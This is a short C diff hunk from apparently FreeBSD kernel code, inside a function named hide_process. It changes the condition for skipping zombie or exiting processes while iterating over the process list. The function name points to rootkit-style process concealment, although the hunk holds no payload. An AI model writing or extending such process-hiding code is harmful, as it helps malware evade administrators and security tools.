@@ -298,7 +298,7 @@ static void hide_process(pid_t pid) {
 
     FOREACH_PROC_IN_SYSTEM(p) {
         PROC_LOCK(p);
-        if (!p->p_vmspace || (p->p_flag & P_WEXIT)) {
+        if (p->p_state == PRS_ZOMBIE || (p->p_flag & P_WEXIT)) {
             PROC_UNLOCK(p);
             continue;
         }
